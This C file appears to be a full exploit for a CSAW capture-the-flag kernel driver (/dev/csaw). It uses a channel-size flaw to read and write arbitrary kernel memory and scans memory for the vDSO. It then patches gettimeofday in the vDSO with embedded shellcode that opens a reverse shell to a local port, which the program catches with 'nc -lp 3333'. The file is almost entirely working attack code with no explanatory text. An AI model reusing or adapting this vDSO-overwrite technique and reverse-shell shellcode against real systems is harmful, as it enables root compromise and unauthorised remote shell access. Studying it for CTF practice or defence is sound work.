#include <stdio.h>
#include <sys/prctl.h>       
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <sys/auxv.h> 



#define CSAW_IOCTL_BASE     0x77617363
#define CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE+1
#define CSAW_OPEN_CHANNEL   CSAW_IOCTL_BASE+2
#define CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE+3
#define CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4
#define CSAW_READ_CHANNEL   CSAW_IOCTL_BASE+5
#define CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE+6
#define CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE+7
#define CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE+8


struct alloc_channel_args {
    size_t buf_size;
    int id;
};

struct open_channel_args {
    int id;
};

struct shrink_channel_args {
    int id;
    size_t size;
};

struct read_channel_args {
    int id;
    char *buf;
    size_t count;
};

struct write_channel_args {
    int id;
    char *buf;
    size_t count;
};

struct seek_channel_args {
    int id;
    loff_t index;
    int whence;
};

struct close_channel_args {
    int id;
};

void print_hex(char *buf,size_t len){
    int i ;
    for(i = 0;i<((len/8)*8);i+=8){
        printf("0x%lx",*(size_t *)(buf+i) );
        if (i%16)
            printf(" ");
        else
            printf("\n");
    }
}

void show_vdso_userspace(int len){
    size_t addr=0;
    addr=getauxval(AT_SYSINFO_EHDR);
    if (addr<0){
        puts("[-]cannot get vdso addr");
        return;
    }
    for (int i=len; i<0x1000; i++)
    {
        printf("%x ",*(char *)(addr+i));
    }
}
int check_vdso_shellcode(char *shellcode)
{
    size_t addr=0;
    addr=getauxval(AT_SYSINFO_EHDR);
    printf("vdso:%lx\n",addr);
    if (addr<0){
        puts("[-]cannot get vdso addr");
        return 0;
    }
    if (memmem((char *)addr,0x1000,shellcode,strlen(shellcode))){
        return 1;
    }
    return 0;
}

int main(){
    int fd=-1;
    size_t result=0;
    struct alloc_channel_args alloc_args;
    struct shrink_channel_args shrink_args;
    struct seek_channel_args seek_args;
    struct read_channel_args read_args;
    struct close_channel_args close_args;
    struct write_channel_args write_args;
    size_t addr=0xffffffff80000000;
    size_t read_cred=0;
    size_t cred=0;
    size_t target_addr;
    int root_cred[12];
    char shellcode[]="\x90\x53\x48\x31\xC0\xB0\x66\x0F\x05\x48\x31\xDB\x48\x39\xC3\x75\x0F\x48\x31\xC0\xB0\x39\x0F\x05\x48\x31\xDB\x48\x39\xD8\x74\x09\x5B\x48\x31\xC0\xB0\x60\x0F\x05\xC3\x48\x31\xD2\x6A\x01\x5E\x6A\x02\x5F\x6A\x29\x58\x0F\x05\x48\x97\x50\x48\xB9\xFD\xFF\xF2\xFA\x80\xFF\xFF\xFE\x48\xF7\xD1\x51\x48\x89\xE6\x6A\x10\x5A\x6A\x2A\x58\x0F\x05\x48\x31\xDB\x48\x39\xD8\x74\x07\x48\x31\xC0\xB0\xE7\x0F\x05\x90\x6A\x03\x5E\x6A\x21\x58\x48\xFF\xCE\x0F\x05\x75\xF6\x48\x31\xC0\x50\x48\xBB\xD0\x9D\x96\x91\xD0\x8C\x97\xFF\x48\xF7\xD3\x53\x48\x89\xE7\x50\x57\x48\x89\xE6\x48\x31\xD2\xB0\x3B\x0F\x05\x48\x31\xC0\xB0\xE7\x0F\x05";

    setvbuf(stdout,0LL,2,0LL);
    char *buf=malloc(0x1000);
    fd = open("/dev/csaw",O_RDWR);
    if (fd<0){
        puts("[-] open error");
        exit(-1);
    }

    alloc_args.buf_size=0x100;
    alloc_args.id=-1;
    ioctl(fd,CSAW_ALLOC_CHANNEL,&alloc_args);
    if (alloc_args.id==-1){
        puts("[-] alloc_channel error");
        exit(-1);
    }
    printf("[+] now we get a channel %d\n",alloc_args.id);
    shrink_args.id=alloc_args.id;
    shrink_args.size=0x100+1;
    ioctl(fd,CSAW_SHRINK_CHANNEL,&shrink_args);
    puts("[+] we can read and write any memory");
    for(;addr<0xffffffffffffefff;addr+=0x1000)
    {
        seek_args.id=alloc_args.id;
        seek_args.index=addr-0x10;
        seek_args.whence=SEEK_SET;
        ioctl(fd,CSAW_SEEK_CHANNEL,&seek_args);
        read_args.id=alloc_args.id;
        read_args.buf=buf;
        read_args.count=0x1000;
        ioctl(fd,CSAW_READ_CHANNEL,&read_args);
        if (!strcmp("gettimeofday",buf+0x2cd)){
            result=addr;
            printf("[+] found vdso %lx\n",result);
            //int test;
            //scanf("Wait! %d",&test);   //!!!!!  to dump VDSO
            break;
        }
    }
    if (result==0){
        puts("not found , try again ");
        exit(-1);
    }
    //ioctl(fd,CSAW_CLOSE_CHANNEL,&close_args);
    seek_args.id=alloc_args.id;
    seek_args.index=result-0x10+0xc80;   //  $ objdump xxx -T  查看gettimeofday代码偏移
    seek_args.whence=SEEK_SET;
    ioctl(fd,CSAW_SEEK_CHANNEL,&seek_args);
    write_args.id=alloc_args.id;
    write_args.buf=shellcode;
    write_args.count=strlen(shellcode);
    ioctl(fd,CSAW_WRITE_CHANNEL,&write_args);
    if (check_vdso_shellcode(shellcode)!=0){
        puts("[+] shellcode is written into vdso, waiting for a reverse shell :");
        system("nc -lp 3333");
    }
    else {
        puts("[-] something wrong ... ");
        exit(-1);
    }
    //show_vdso_userspace(0xc30);
    //ioctl(fd,CSAW_CLOSE_CHANNEL,&close_args);
    return 0;
}






